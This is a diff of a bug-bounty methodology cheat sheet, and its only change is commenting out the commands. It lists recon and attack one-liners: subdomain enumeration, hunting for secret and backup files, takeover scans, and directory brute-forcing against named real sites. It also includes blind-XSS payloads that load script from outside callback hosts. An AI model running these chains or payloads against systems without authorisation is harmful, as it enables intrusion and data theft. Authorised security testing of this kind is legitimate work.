@@ -1,63 +1,63 @@
 
-                      #  Bug Hunting methodology
+#Bug Hunting methodology
 
 -----------------------------------------------------------------------------
-subfinder -d example.com -all  -recursive > subdomain.txt
+    # subfinder -d example.com -all  -recursive > subdomain.txt
 
-assetfinder test.com | anew >> subdomain.txt
+    # assetfinder test.com | anew >> subdomain.txt
 
-cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+    # cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
 
-katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
+    # katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
 
-cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+    # cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
 
-cat allurls.txt | grep -E "\.js$" >> js.txt
+    # cat allurls.txt | grep -E "\.js$" >> js.txt
 
-cat sorted.txt | httpx -mc 200 -o live-urls.txt
+    # cat sorted.txt | httpx -mc 200 -o live-urls.txt
 
-cat live-urls.txt | grep "=" > live-parameters.txt
+    # cat live-urls.txt | grep "=" > live-parameters.txt
 
-cat alljs.txt | nuclei -t /nuclei-templates/http/exposures/ 
+    # cat alljs.txt | nuclei -t /nuclei-templates/http/exposures/ 
 
-echo www.example.com | katana -ps | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30
+    # echo www.example.com | katana -ps | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30
 
-nuclei -t /nuclei-templates/takeovers/ -l live-subs.txt
+    # nuclei -t /nuclei-templates/takeovers/ -l live-subs.txt
 
-echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /nuclei-templates/exposures/ -silent > secrets.txt
+    # echo target.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /nuclei-templates/exposures/ -silent > secrets.txt
 
-echo uber.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+    # echo uber.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
 
-python3 paramspider.py --domain indrive.com
+    # python3 paramspider.py --domain indrive.com
 
-python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output g.txt
+    # python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output g.txt
 
-cat indrive.txt | kxss  ( looking for reflected :-  "<> )
+    # cat indrive.txt | kxss  ( looking for reflected :-  "<> )
 
 
-dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+    # dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
 
-subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/binbash></script>' -parameters
+    # subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/binbash></script>' -parameters
 
-subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
+    # subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
 
-python3 /opt/Corsy/corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+    # python3 /opt/Corsy/corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
 ~Cors Poc Exploit : https://github.com/hunthack3r/PoCors.git ~
 
 ## Looking for Hidden parameters :-
 
 
-arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
+    # arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
 
-waybackurls example.com | gf xss | grep '=' | qsreplace '"><script src=https://xss.report/c/binbash></script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
+    # waybackurls example.com | gf xss | grep '=' | qsreplace '"><script src=https://xss.report/c/binbash></script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
 
-dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
+    # dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
 
-dalfox file urls.txt -b https://hahwul.xss.ht
+    # dalfox file urls.txt -b https://hahwul.xss.ht
 
-echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
+    # echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
 
-cat urls.txt | Gxss -c 100 -p XssReflected
+    # cat urls.txt | Gxss -c 100 -p XssReflected
 
 ## Sql Injection :-
 
